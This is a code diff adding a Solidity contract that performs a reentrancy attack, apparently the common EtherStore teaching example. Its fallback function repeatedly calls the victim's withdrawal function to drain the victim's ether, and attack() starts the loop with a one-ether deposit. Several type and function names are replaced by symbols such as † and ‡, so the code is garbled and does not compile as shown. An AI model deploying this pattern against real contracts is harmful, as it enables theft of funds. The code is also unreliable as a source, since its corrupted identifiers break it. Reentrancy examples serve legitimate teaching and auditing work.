@@ -1,0 +1,26 @@
+contract Tester {
+    † public target;
+
+    constructor(address _etherStoreAddress) {
+        target = †(_etherStoreAddress);
+    }
+
+    // Fallback is called when the victim contract sends Ether to this contract.
+    fallback() external payable {
+        if (address(target).balance >= 1 ether) {
+            target.‡();
+        }
+    }
+
+    // Deposits a singular Ether and then attempts to withdraw it.
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        target.※{value: 1 ether}();
+        target.‡();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
